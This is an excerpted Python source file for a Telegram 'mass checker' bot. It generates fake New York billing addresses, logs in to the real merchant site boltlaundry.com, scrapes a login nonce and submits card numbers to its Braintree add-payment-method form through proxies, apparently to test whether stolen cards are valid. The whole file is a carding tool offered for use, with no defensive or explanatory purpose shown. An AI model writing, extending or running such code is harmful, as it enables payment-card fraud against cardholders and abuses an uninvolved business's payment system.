...
def generate_address():
    ...
    streets = ["123 Allen St", "123 Allen"]
    zips = ["10002", "10012"]
    city = random.choice(cities)
    return city, 'NY', f"{random.randint(1, 999)} {random.choice(streets)}", random.choice(zips)
...
async def check_cc(cc_details):
    ...
    if 'visa' in card_type_lower:
        card_type_for_form = 'visa'
    elif 'master' in card_type_lower:
        card_type_for_form = 'master-card'
    elif 'american' in card_type_lower:
        card_type_for_form = 'american-express'
    elif 'discover' in card_type_lower:
        card_type_for_form = 'discover'
    else:
        card_type_for_form = 'master-card'  # default
    ...
    try:
        async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=ssl_context)) as session:
            async with session.get('https://boltlaundry.com/my-login/', headers=headers, proxy=proxies['http'] if proxies else None) as r:
                text = await r.text()
                reg = re.search(r'name="ihc_login_nonce" value="(.*?)"', text).group(1)
            ...
            headers.update({
                'authority': 'boltlaundry.com', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'content-type': 'application/x-www-form-urlencoded', 'origin': 'https://boltlaundry.com',
                'referer': 'https://boltlaundry.com/my-account/add-payment-method/'
            })
            data = [
                ('payment_method', 'braintree_credit_card'), (f'wc-braintree-credit-card-card-type', card_type_for_form),
...
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    await update.message.reply_text(
        "🔥 𝐖𝐞𝐥𝐜𝐨𝐦𝐞 𝐓𝐨 𝐅𝐍 𝐌𝐀𝐒𝐒 𝐂𝐇𝐞𝐂𝐊𝐄𝐑 𝐁𝐎𝐓!\n\n"
